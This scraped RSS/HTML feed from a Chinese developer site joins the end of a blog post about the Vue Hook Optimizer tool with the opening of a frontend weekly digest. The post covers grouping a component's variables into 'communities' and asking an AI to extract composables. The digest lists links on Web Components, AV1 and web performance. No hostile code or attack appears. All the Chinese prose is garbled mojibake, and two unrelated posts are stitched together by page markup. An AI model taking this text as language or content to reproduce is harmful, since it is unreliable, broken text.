<h2 data-id="heading-5">ä¸€ä¸ªçœŸå®çš„ä¾‹å­</h2>
<p>å‡è®¾ä½ æœ‰ä¸ªç»„ä»¶ï¼Œä»£ç é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
// ä¸€å¨ï¼Œä»€ä¹ˆéƒ½æ··åœ¨ä¸€èµ·
const count = ref(0);
const searchText = ref('');
const searchList = ref([]);
const isSearching = ref(false);
const isDialogOpen = ref(false);
const apiData = ref(null);
const dialogTitle = ref('');

const doubleCount = computed(() =&gt; count.value * 2);
const increment = () =&gt; count.value++;

function handleOpenDialog() { isDialogOpen.value = true; }
function handleCloseDialog() { isDialogOpen.value = false; }

async function loadApiData() { /* ... */ }
function processApiData(data) { /* ... */ }

// è¿˜æœ‰æ›´å¤š...
&lt;/script&gt;

&lt;template&gt;
  &lt;div&gt;
    &lt;input v-model="searchText"&gt;
    &lt;button @click="handleOpenDialog"&gt;
      Open
    &lt;/button&gt;
    &lt;div&gt;{{ doubleCount }}&lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;
</code></pre>
<p><strong>æ²¡æœ‰ç¤¾åŒºåˆ’åˆ†æ—¶ï¼Œä½ ä¼šçº ç»“ï¼š</strong></p>
<ul>
<li>æˆ‘åˆ°åº•è¯¥åˆ†æˆå‡ ä¸ª Composableï¼Ÿ2 ä¸ªï¼Ÿ3 ä¸ªï¼Ÿ</li>
<li>å“ªäº›ä¸œè¥¿åº”è¯¥åœ¨ä¸€èµ·ï¼Œå“ªäº›åº”è¯¥åˆ†å¼€ï¼Ÿ</li>
<li>è¿™äº›ä¸œè¥¿ä¹‹é—´çš„å…³è”ç¨‹åº¦æœ‰å¤šæ·±ï¼Ÿ</li>
</ul>
<p><strong>ç”¨äº†ç¤¾åŒºåˆ’åˆ†ä»¥åï¼Œæ ‘è§†å›¾å‘Šè¯‰ä½ ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">Variable Communities
â”œâ”€â”€ Community <span class="hljs-number">1</span> (<span class="hljs-number">3</span> members) æœç´¢
â”‚   â”œâ”€â”€ searchText
â”‚   â”œâ”€â”€ searchList
â”‚   â””â”€â”€ isSearching
â”œâ”€â”€ Community <span class="hljs-number">2</span> (<span class="hljs-number">4</span> members) å¯¹è¯æ¡†
â”‚   â”œâ”€â”€ isDialogOpen
â”‚   â”œâ”€â”€ dialogTitle
â”‚   â”œâ”€â”€ handleOpenDialog
â”‚   â””â”€â”€ handleCloseDialog
â”œâ”€â”€ Community <span class="hljs-number">3</span> (<span class="hljs-number">3</span> members) è®¡æ•°
â”‚   â”œâ”€â”€ count
â”‚   â”œâ”€â”€ doubleCount
â”‚   â””â”€â”€ increment
â””â”€â”€ Community <span class="hljs-number">4</span> (<span class="hljs-number">3</span> members) API
    â”œâ”€â”€ apiData
    â”œâ”€â”€ loadApiData
    â””â”€â”€ processApiData
</code></pre>
<p><strong>ç°åœ¨å°±æ¸…æ¥šäº†ï¼š</strong></p>
<ol>
<li><strong>ä¸€å…± 4 ä¸ªç‹¬ç«‹çš„åŠŸèƒ½æ¨¡å—</strong>ï¼Œå¯ä»¥åˆ†åˆ«æå–</li>
<li><strong>ç‚¹å‡»æ¯ä¸ª Community çœ‹é«˜äº®ä»£ç </strong>ï¼Œç¡®è®¤è¿™å°±æ˜¯ä½ æƒ³è¦çš„åˆ†ç»„</li>
<li><strong>ç„¶åå‘Šè¯‰ AI</strong>ï¼š"æˆ‘çœ‹åˆ°äº† 4 ä¸ªç¤¾åŒºï¼Œæˆ‘æƒ³åˆ†åˆ«æå–ä¸º <code>useSearch</code>ã€<code>useDialog</code>ã€<code>useCounter</code> å’Œ <code>useApiData</code>ï¼Œå¸®æˆ‘ç”Ÿæˆä»£ç "</li>
</ol>
<h2 data-id="heading-6">è®© LLM çœŸæ­£è¯»æ‡‚ç»„ä»¶</h2>
<p>è¿™æ‰æ˜¯æœ€æœ‰æ„æ€çš„éƒ¨åˆ†ã€‚å½“æŠŠ MCP å’Œç¤¾åŒºåˆ’åˆ†ç»“åˆèµ·æ¥ï¼Œä¼šå‘ç”Ÿå•¥ï¼Ÿ</p>
<h3 data-id="heading-7">ä¼ ç»Ÿçš„å¥—è·¯ï¼ˆæ•ˆç‡ä½ï¼‰</h3>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¸®æˆ‘ä¼˜åŒ–è¿™ä¸ªç»„ä»¶å§"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "æˆ‘çœ‹åˆ°å¯ä»¥æå– 5 ä¸ª Composableï¼Œå« <code>useA</code>, <code>useB</code>, ..."</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "ç­‰ç­‰ï¼Œè¿™æ ·åˆ†ä¸å¯¹ï¼ŒA å’Œ B åº”è¯¥åœ¨ä¸€èµ·å•Š"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "å“¦ï¼Œé‚£æˆ‘é‡æ–°ç»™ä½ æƒ³æƒ³..."</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å—¯...è¿˜æ˜¯ä¸å¤ªå¯¹..."</p>
</blockquote>
<p><strong>ç»“æœï¼š</strong> æ¥æ¥å›å›å‡ ä¸ªå›åˆæ‰èƒ½å®šä¸‹æ¥ã€‚</p>
<h3 data-id="heading-8">æ–°çš„å¥—è·¯ï¼ˆç›´æ¥å¿«ç‹ å‡†ï¼‰</h3>
<p>ç°åœ¨ mcp çš„è¿”å›ç»“æœä¸­ä¼šåŒ…å«ç¤¾åŒºåˆ’åˆ†çš„ä¿¡æ¯ï¼ŒAI ä¼šç›´æ¥æ ¹æ®è¿™äº›ä¿¡æ¯ç”Ÿæˆä»£ç ã€‚</p>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¸®æˆ‘ä¼˜åŒ–è¿™ä¸ªç»„ä»¶å§"</p>
</blockquote>
<blockquote>
<p><strong>AIï¼š</strong> "æˆ‘çœ‹åˆ° 4 ä¸ªç¤¾åŒºï¼Œæˆ‘æƒ³åˆ†åˆ«æå–ä¸º useSearchã€useDialog ç­‰ï¼Œä½ çœ‹æ€ä¹ˆåšï¼Ÿ"</p>
</blockquote>
<blockquote>
<p><strong>ä½ ï¼š</strong> "å¾ˆä¸é”™ï¼Œå°±æŒ‰ç…§è¿™ä¸ªåˆ’åˆ†"</p>
</blockquote>
<p><strong>ç»“æœï¼š</strong> AI ç”Ÿæˆçš„ä»£ç ä¼šéå¸¸ç²¾å‡†ï¼Œç¬¦åˆä½ çš„é¢„æœŸã€‚</p>
<h3 data-id="heading-9">ä¸ºä»€ä¹ˆå·®åˆ«è¿™ä¹ˆå¤§ï¼Ÿ</h3>
<p>è¯´ç™½äº†å°±ä¸€å¥è¯ï¼š<strong>AI å’Œä½ ç»ˆäºå¯¹ä¸Š"é¢‘é“"äº†ã€‚</strong></p>
<ul>
<li><strong>ä½ </strong> çœ‹ç€é«˜äº®ä»£ç ï¼ŒçœŸæ­£ç†è§£äº†ä»£ç çš„åˆ†ç•Œçº¿</li>
<li><strong>AI</strong> çœ‹ç€ç¤¾åŒºæ•°æ®ï¼Œå‡†ç¡®äº†è§£äº†ä½ çš„åˆ†å‰²æ–¹æ¡ˆ</li>
<li><strong>åŒæ–¹</strong> åŸºäºåŒä¸€ä»½ä¿¡æ¯èŠå¤©ï¼Œè‡ªç„¶å°±èƒ½è¾¾æˆå…±è¯†</li>
</ul>
<h3 data-id="heading-10">SKILL.md</h3>
<p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯æ”¯æŒ SKILL çš„ç¼–è¾‘å™¨æ¯”å¦‚ Claude Code æˆ–è€… VSCode ï¼Œé‚£å¼ºçƒˆæ¨èä½ å®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer%2Fblob%2Fmaster%2Fpackages%2Fmcp%2Frefactor_prompt_zh.md" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer/blob/master/packages/mcp/refactor_prompt_zh.md" ref="nofollow noopener noreferrer">ç»„ä»¶é‡æ„</a> SKILLã€‚ä½ åªéœ€è¦åœ¨å®‰è£… mcp åï¼Œå°†é“¾æ¥ä¸­çš„å†…å®¹å¤åˆ¶åˆ° <code>~/.claude/skills/vho-refactor/SKILL.md</code> ä¸­ã€‚åœ¨å’Œ llm æ²Ÿé€šæ—¶ï¼Œè¦æ±‚ä»–ä½¿ç”¨ vho-refactor æŠ€èƒ½åˆ†æå’Œé‡æ„ç»„ä»¶ã€‚</p>
<h2 data-id="heading-11">åŸç†æ¦‚è¿°</h2>
<p>ä½ å¯èƒ½å¥½å¥‡ï¼š<strong>Vue Hook Optimizer èƒŒåæ˜¯æ€ä¹ˆæ‰¾å‡ºè¿™äº›ç¤¾åŒºçš„ï¼Ÿ</strong></p>
<p>ç²—ç•¥è®²è®²ï¼š</p>
<ol>
<li><strong>å»ºç«‹å…³ç³»ç½‘</strong> - çœ‹ä»£ç é‡Œå“ªäº›å˜é‡äº’ç›¸ä¾èµ–ï¼Œå“ªäº›è¢«åŒä¸€ä¸ªåœ°æ–¹ä½¿ç”¨</li>
<li><strong>çœ‹åå­—çš„å«ä¹‰</strong> - åˆ†æå˜é‡åå­—æœ¬èº«çš„æ„æ€ã€‚æ¯”å¦‚ <code>isOpen</code> å’Œ <code>handleOpenChange</code> è™½ç„¶ä¸€ä¸ªæ˜¯çŠ¶æ€ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å‡½æ•°ï¼Œä½†å®ƒä»¬åœ¨è¯­ä¹‰ä¸Šæ˜¯ç›¸å…³çš„</li>
<li><strong>è‡ªåŠ¨åˆ†ç»„</strong> - æ ¹æ®ä¸Šé¢ä¸¤ç‚¹ï¼Œæ‰¾å‡ºå…³è”åº¦æœ€é«˜çš„å˜é‡ç¾¤ä½“ï¼Œç»™å®ƒä»¬åˆ†åˆ°ä¸€ä¸ªç¤¾åŒºé‡Œ</li>
</ol>
<p><strong>ç±»æ¯”ä¸€ä¸‹ï¼š</strong> å°±åƒæ ¹æ®å…¬å¸é‡Œäººä»¬çš„æ²Ÿé€šé¢‘ç‡å’Œå…±åŒè¯é¢˜ï¼Œç³»ç»Ÿè‡ªåŠ¨æŠŠç›¸å…³çš„äººåˆ†åˆ°ä¸€ä¸ªå°ç»„ï¼Œä¸ç”¨ä½ æ‰‹åŠ¨æŒ‡å®šã€‚</p>
<p>å…³é”®æ˜¯ï¼Œè¿™å¥—ä¸œè¥¿ä¸ä»…çœ‹"ä»£ç çš„ä¾èµ–å…³ç³»"ï¼Œè¿˜çœ‹"ä»£ç çš„å«ä¹‰"ã€‚æ‰€ä»¥ç»“æœå¾€å¾€æ›´ç¬¦åˆäººçš„ç›´è§‰ï¼Œä¸æ˜¯å†·å†°å†°çš„çº¯é€»è¾‘åˆ†æã€‚</p>
<h2 data-id="heading-12">æ•´ä¸ªæµç¨‹æ˜¯å•¥æ ·çš„</h2>
<p>ç°åœ¨ä½ æœ‰äº†å®Œæ•´çš„é“¾è·¯ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">åˆ†æä»£ç     â†’  çœ‹ä¾èµ–å›¾    â†’  çœ‹ç¤¾åŒºæ ‘    â†’  å’Œ AI èŠå¤©    â†’  ç”Ÿæˆä»£ç 
<span class="hljs-code">    â†“             â†“              â†“              â†“              â†“
ç»Ÿè®¡é—®é¢˜    â†’  ç†è§£ç»“æ„    â†’  ç¡®è®¤åˆ†ç»„    â†’  ç²¾å‡†å»ºè®®      â†’  å¼€å§‹é‡æ„
</span></code></pre>
<ol>
<li><strong>åˆ†æ</strong> - æ‰¾å‡ºæœªç”¨çš„ä¸œè¥¿ã€å¥—å¨ƒå‡½æ•°ã€ä¹±ä¸ƒå…«ç³Ÿçš„è€¦åˆ</li>
<li><strong>å¯è§†åŒ–</strong> - çœ‹ä»£ç çš„ä¾èµ–å…³ç³»å’Œç¤¾åŒºåˆ†ç»„</li>
<li><strong>AI åŠ æŒ</strong> - å‘Šè¯‰ AI ä½ çš„æƒ³æ³•ï¼Œå®ƒç»™å‡ºç²¾å‡†æ–¹æ¡ˆ</li>
<li><strong>å¼€å¹²</strong> - æŒ‰ç…§ç¤¾åŒºåˆ’åˆ†æå– Composable æˆ– Custom Hook</li>
</ol>
<h2 data-id="heading-13">å°¾å·´</h2>
<p>ä»£ç ä¼˜åŒ–è¿™ä»¶äº‹ï¼Œæ²¡æœ‰ä»€ä¹ˆ"ä¸€é”®æå®š"çš„ã€‚éœ€è¦ä½ è‡ªå·±å»ç†è§£ï¼Œéœ€è¦ AI æ¥å¸®å¿™ï¼Œä¹Ÿéœ€è¦ä¸€ä¸ªå¥½çš„å¯è§†åŒ–å·¥å…·æ‰èƒ½çœŸæ­£çœ‹æ¸…æ¥šã€‚</p>
<p><strong>ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½å°±æ˜¯é‚£æŠŠé’¥åŒ™ã€‚</strong> å®ƒè®©ä½ èƒ½ï¼š</p>
<ul>
<li>ä¸€çœ¼çœ‹ç©¿ä»£ç çš„"è‡ªç„¶åˆ†ç•Œ"</li>
<li>è®© AI æ‡‚ä½ çš„æƒ³æ³•</li>
<li>æœ‰ä¿¡å¿ƒåœ°åšå‡ºé‡æ„å†³ç­–</li>
</ul>
<p>å¦‚æœä½ å¯¹è¿™ä¸ªåŠŸèƒ½æ„Ÿå…´è¶£ï¼Œå¯ä»¥æ‰“å¼€ VSCodeï¼Œè£…ä¸Š <a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dzcf0508.vue-hook-optimizer-ext" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=zcf0508.vue-hook-optimizer-ext" ref="nofollow noopener noreferrer">Vue Hook Optimizer æ‰©å±•</a>ï¼Œæ‰¾ä¸€ä¸ªå¤æ‚çš„ç»„ä»¶ï¼Œè·‘ä¸€éåˆ†æã€‚</p>
<hr/>
<p>æ¬¢è¿æ¥ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzcf0508%2Fvue-hook-optimizer" target="_blank" title="https://github.com/zcf0508/vue-hook-optimizer" ref="nofollow noopener noreferrer">GitHub</a> æ Issue æˆ–è€…è®¨è®ºã€‚æˆ‘å¾ˆæƒ³å¬å¬ä½ ç”¨ç¤¾åŒºåˆ’åˆ†åŠŸèƒ½åçš„åé¦ˆï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰]]></title>    <link>https://juejin.cn/post/7589172193151500324</link>    <guid>https://juejin.cn/post/7589172193151500324</guid>    <pubDate>2025-12-30T02:43:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589172193151500324" data-draft-id="7589167105385824292" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-30T02:43:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘å®‰ä¸œå°¼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            â°å‰ç«¯å‘¨åˆŠç¬¬446æœŸï¼ˆ2025å¹´12æœˆ22æ—¥â€“12æœˆ27æ—¥ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘å®‰ä¸œå°¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:43:40.000Z" title="Tue Dec 30 2025 02:43:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ğŸ“¢ <strong>å®£è¨€</strong>ï¼š<strong>æ¯å‘¨æ›´æ–°å›½å¤–è®ºå›çš„å‰ç«¯çƒ­é—¨æ–‡ç« ï¼Œæ¨èå¤§å®¶é˜…è¯»/ç¿»è¯‘ï¼Œç´§è·Ÿæ—¶äº‹ï¼ŒæŒæ¡å‰ç«¯æŠ€æœ¯åŠ¨æ€ï¼Œä¹Ÿä¸ºå†™ä½œæˆ–çªç ´æ–°é¢†åŸŸæä¾›çµæ„Ÿ~</strong></p>
<p>æ¬¢è¿å¤§å®¶è®¿é—®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">github.com/TUARAN/fronâ€¦</a>
é¡ºæ‰‹ç‚¹ä¸ª â­ star æ”¯æŒï¼Œæ˜¯æˆ‘ä»¬æŒç»­è¾“å‡ºçš„ç»­èˆªç”µæ± ğŸ”‹âœ¨ï¼</p>
<p>åœ¨çº¿ç½‘å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffwdc.pages.dev%2F" target="_blank" title="https://fwdc.pages.dev/" ref="nofollow noopener noreferrer">fwdc.pages.dev/</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8bc20a8cbd3547d18f03a38aa7d01bec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667420&amp;x-signature=RfLnzf3LoWSRLODlksBnHhyW%2FVU%3D" alt="å‰ç«¯å‘¨åˆŠå°é¢" loading="lazy"/></p>
<hr/>
<p>ğŸ’¬ <strong>æ¨èè¯­</strong></p>
<p>å›é¡¾ 2025 å¹´ï¼Œå‰ç«¯åœˆä»æ ‡å‡†æ¼”è¿›ã€ç»„ä»¶åŒ–å¤å…´åˆ°æ€§èƒ½æŒ‡æ ‡æ‹†è§£éƒ½æœ‰å€¼å¾—å¤ç›˜çš„æ•…äº‹ã€‚æœ¬æœŸèšç„¦å¹´åº¦åå¤§å‰ç«¯å™äº‹ã€Web Components çš„åå¼¹åŠ¿å¤´ã€AV1 ç¼–è§£ç å™¨æ–©è·è‰¾ç¾å¥–èƒŒåçš„è¡Œä¸šæ¨åŠ¨åŠ›ï¼Œä»¥åŠç”¨ç°ä»£æŠ€æœ¯é‡ç° 8-bit å¤å¤ä¸–ç•Œçš„åˆ›æ„å®è·µã€‚æ€§èƒ½ç¯‡æ•´ç†äº†å­—ä½“æ‡’åŠ è½½ã€TTFB æŒ‡æ ‡è¯¯åŒºã€URL å‚æ•°ä¼˜åŒ–ä¸ DevTools è°ƒè¯•æŠ€å·§ï¼›CSS éƒ¨åˆ†å¸¦æ¥ç²˜æ€§å®šä½çš„æ»šåŠ¨åˆ‡æ¢ã€<code>text-decoration-inset</code> çš„æ’ç‰ˆæ–°æ€è·¯ä¸å®¹å™¨æŸ¥è¯¢çš„ 2026 å±•æœ›ï¼›JavaScript æ ç›®åˆ™æ¶µç›– Vue ç”Ÿæ€çš„è§’è‰²ç”»åƒã€å¹´åº¦è¶‹åŠ¿å›é¡¾ã€Zustand å…¥é—¨ä¸çº¯ HTML æ›¿ä»£ JS çš„æç®€æ¡ˆä¾‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">ğŸ—‚ æœ¬æœŸç²¾é€‰ç›®å½•</h2>
<h3 data-id="heading-1">ğŸ§­ Web å¼€å‘</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.logrocket.com%2Ffrontend-wrapped-2025%2F" target="_blank" title="https://blog.logrocket.com/frontend-wrapped-2025/" ref="nofollow noopener noreferrer">Frontend Wrapped 2025: The 10 storylines that defined the year</a>ï¼šç›˜ç‚¹ 2025 å¹´å¡‘é€ å‰ç«¯è¡Œä¸šçš„åå¤§äº‹ä»¶ï¼Œä» RSC è½åœ°åˆ° AI é©±åŠ¨å¼€å‘çš„æ½®æ¶Œï¼Œä¸ºå›¢é˜Ÿå¹´åº¦å¤ç›˜æä¾›å‚è€ƒåæ ‡ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fthenewstack.io%2Fweb-components-are-the-comeback-nobody-saw-coming%2F" target="_blank" title="https://thenewstack.io/web-components-are-the-comeback-nobody-saw-coming/" ref="nofollow noopener noreferrer">Web Components Are the Comeback Nobody Saw Coming</a>ï¼šè§‚å¯Ÿ Web Components å¦‚ä½•å‡­å€Ÿè·¨æ¡†æ¶äº’æ“ä½œå’Œå¹³å°çº§æ”¯æŒé‡æ–°ç«™ä¸Šèˆå°ä¸­å¤®ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.mozilla.org%2Fen%2Fmozilla%2Fav1-video-codec-wins-emmy%2F" target="_blank" title="https://blog.mozilla.org/en/mozilla/av1-video-codec-wins-emmy/" ref="nofollow noopener noreferrer">When a video codec wins an Emmy</a>ï¼šMozilla åˆ†äº« AV1 è§†é¢‘ç¼–è§£ç å™¨æ‹¿ä¸‹å·¥ç¨‹ç±»è‰¾ç¾å¥–çš„å†ç¨‹ï¼Œå±•ç¤ºå¼€æ”¾æ ‡å‡†æ¨åŠ¨åª’ä½“ä½“éªŒçš„ä»·å€¼ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2F2025%2F12%2F23%2Fbuilding-a-nostalgic-8-bit-universe-with-modern-tech-a-vibe-coding-journey%2F" target="_blank" title="https://tympanus.net/codrops/2025/12/23/building-a-nostalgic-8-bit-universe-with-modern-tech-a-vibe-coding-journey/" ref="nofollow noopener noreferrer">Building a Nostalgic 8-bit Universe with Modern Tech: A Vibe Coding Journey</a>ï¼šåˆ©ç”¨ Three.jsã€GSAP ä¸ç°ä»£æ¸²æŸ“ç®¡çº¿å¤åˆ» 8-bit æ—¶ä»£çš„æ‹Ÿç‰©äº¤äº’ï¼Œè¯¦è§£çµæ„Ÿåˆ°ä¸Šçº¿çš„åˆ›ä½œæµç¨‹ã€‚</li>
</ul>
<h4 data-id="heading-2">âš¡ æ€§èƒ½</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhighperformancewebfonts.com%2Fread%2Flazy-loading-optional-fonts" target="_blank" title="https://highperformancewebfonts.com/read/lazy-loading-optional-fonts" ref="nofollow noopener noreferrer">Lazy-Loading Optional Fonts with Native Browser API</a>ï¼šé€šè¿‡ CSS Font Loading API æŒ‰éœ€æ‡’åŠ è½½å¯é€‰å­—ä½“ï¼Œå…¼é¡¾å“ç‰Œä½“éªŒä¸é¦–å±æ€§èƒ½ã€‚</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcalendar.perfplanet.com%2F2025%2Fchrome-devtools-for-debugging-web-performance%2F" target="_blank" title="https://calendar.perfplanet.com/2025/chrome-devtools-for-debugging-web-performance/" ref="nofollow noopener noreferrer">Chrome DevTools for Debugging Web Performance</a>ï¼šæ·±æŒ– DevTools ä¸­çš„æ€§èƒ½é¢æ¿ã€ç½‘ç»œè®°å½•ä¸å‹æµ‹å·¥å…·ï¼Œæ„å»ºç³»ç»ŸåŒ–çš„æ’æŸ¥æµç¨‹ã€‚</li>
